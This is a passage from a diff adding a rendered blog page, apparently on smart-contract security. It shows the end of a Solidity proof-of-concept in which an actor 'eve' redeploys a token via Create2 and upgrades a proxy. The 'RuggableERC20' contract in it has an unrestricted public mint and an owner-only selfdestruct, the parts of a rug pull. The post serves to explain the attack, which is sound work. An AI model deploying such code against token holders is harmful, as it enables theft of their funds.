+</span></span><span style="display:flex;"><span>        <span style="color:#000">TransparentUpgradeableProxy</span><span style="color:#000;font-weight:bold">(</span><span style="color:#204a87;font-weight:bold">payable</span><span style="color:#000;font-weight:bold">(</span><span style="color:#204a87;font-weight:bold">address</span><span style="color:#000;font-weight:bold">(</span><span style="color:#000">token</span><span style="color:#000;font-weight:bold">))).</span><span style="color:#000">upgradeTo</span><span style="color:#000;font-weight:bold">(</span><span style="color:#000">impl</span><span style="color:#000;font-weight:bold">);</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#8f5902;font-style:italic">// Real call would be:
+</span></span></span><span style="display:flex;"><span><span style="color:#8f5902;font-style:italic"></span>        <span style="color:#8f5902;font-style:italic">// vm.prank(eve);
+</span></span></span><span style="display:flex;"><span><span style="color:#8f5902;font-style:italic"></span>        <span style="color:#8f5902;font-style:italic">// Create2.deploy(uint256(0), bytes32(&#34;salt&#34;), type(RuggableERC20).creationCode);
+</span></span></span><span style="display:flex;"><span><span style="color:#8f5902;font-style:italic"></span>    <span style="color:#000;font-weight:bold">}</span>
+</span></span><span style="display:flex;"><span><span style="color:#000;font-weight:bold">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#204a87;font-weight:bold">contract</span> <span style="color:#000">RuggableERC20</span> <span style="color:#204a87;font-weight:bold">is</span> <span style="color:#000">ERC20</span> <span style="color:#000;font-weight:bold">{</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#204a87;font-weight:bold">address</span> <span style="color:#204a87;font-weight:bold">public</span> <span style="color:#000">owner</span><span style="color:#000;font-weight:bold">;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#204a87;font-weight:bold">constructor</span><span style="color:#000;font-weight:bold">()</span> <span style="color:#000">ERC20</span><span style="color:#000;font-weight:bold">(</span><span style="color:#4e9a06">&#34;Ruggable&#34;</span><span style="color:#000;font-weight:bold">,</span> <span style="color:#4e9a06">&#34;RUG&#34;</span><span style="color:#000;font-weight:bold">,</span> <span style="color:#204a87;font-weight:bold">uint8</span><span style="color:#000;font-weight:bold">(</span><span style="color:#0000cf;font-weight:bold">18</span><span style="color:#000;font-weight:bold">))</span> <span style="color:#000;font-weight:bold">{</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#000">owner</span> <span style="color:#ce5c00;font-weight:bold">=</span> <span style="color:#204a87">msg</span><span style="color:#000;font-weight:bold">.</span><span style="color:#204a87">sender</span><span style="color:#000;font-weight:bold">;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#000;font-weight:bold">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#8f5902;font-style:italic">// Should of course not be publicly callable outside of PoC.
+</span></span></span><span style="display:flex;"><span><span style="color:#8f5902;font-style:italic"></span>    <span style="color:#204a87;font-weight:bold">function</span> <span style="color:#000">mint</span><span style="color:#000;font-weight:bold">(</span><span style="color:#204a87;font-weight:bold">address</span> <span style="color:#000">to</span><span style="color:#000;font-weight:bold">,</span> <span style="color:#204a87;font-weight:bold">uint256</span> <span style="color:#000">amount</span><span style="color:#000;font-weight:bold">)</span> <span style="color:#204a87;font-weight:bold">public</span> <span style="color:#000;font-weight:bold">{</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#000">_mint</span><span style="color:#000;font-weight:bold">(</span><span style="color:#000">to</span><span style="color:#000;font-weight:bold">,</span> <span style="color:#000">amount</span><span style="color:#000;font-weight:bold">);</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#000;font-weight:bold">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#204a87;font-weight:bold">function</span> <span style="color:#000">destroy</span><span style="color:#000;font-weight:bold">()</span> <span style="color:#204a87;font-weight:bold">external</span> <span style="color:#000;font-weight:bold">{</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#204a87">require</span><span style="color:#000;font-weight:bold">(</span><span style="color:#204a87">msg</span><span style="color:#000;font-weight:bold">.</span><span style="color:#204a87">sender</span> <span style="color:#ce5c00;font-weight:bold">==</span> <span style="color:#000">owner</span><span style="color:#000;font-weight:bold">,</span> <span style="color:#4e9a06">&#34;!owner&#34;</span><span style="color:#000;font-weight:bold">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#204a87">selfdestruct</span><span style="color:#000;font-weight:bold">(</span><span style="color:#204a87;font-weight:bold">payable</span><span style="color:#000;font-weight:bold">(</span><span style="color:#204a87">msg</span><span style="color:#000;font-weight:bold">.</span><span style="color:#204a87">sender</span><span style="color:#000;font-weight:bold">));</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#000;font-weight:bold">}</span>
+</span></span><span style="display:flex;"><span><span style="color:#000;font-weight:bold">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#204a87;font-weight:bold">contract</span> <span style="color:#000">Empty</span> <span style="color:#000;font-weight:bold">{</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#000">fallback</span><span style="color:#000;font-weight:bold">()</span> <span style="color:#204a87;font-weight:bold">external</span> <span style="color:#000;font-weight:bold">{}</span>
+</span></span><span style="display:flex;"><span><span style="color:#000;font-weight:bold">}</span>
+</span></span></code></pre></div>
+    
+  </article>
+  <div class="paginator">
+    
+    <a class="link" href="https://garden.merkleplant.xyz/post/introduction-to-solmate/">← prev</a>
+    
+    
+    <a></a>
+    
+  </div>
+  <div class="comment">
+    
+    
+    
+    
+    
+    
+  </div>
+  
+</main>
+
+    <footer id="footer">
+  <div>
+    <span>© 2019</span> - <span>2022</span>
+  </div>
+
+  <div>
+    <span>Powered by </span>
+    <a class="link" href="https://gohugo.io/">Hugo</a>
+    <span> 🍦 Theme </span>
+    <a class="link" href="https://github.com/queensferryme/hugo-theme-texify">TeXify</a>
+  </div>
+
+  <div class="footnote">
+    <span>Contact me on <a class=link href=https://twitter.com/merkleplant_eth>twitter</a>,
+<a class=link href=https://github.com/pmerkleplant>github</a>, or via
+<a class=link href="mailto:pascal@merkleplant.xyz">email</a> |
+<a class=link href=https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh target=_blank rel=noopener>CC BY-NC-SA 4.0</a>
+</span>
+  </div>
+</footer>
+
+  </div>
+
+  
+  
+
+  
+  
+
+  
+  
+
+</body>
+
+</html>
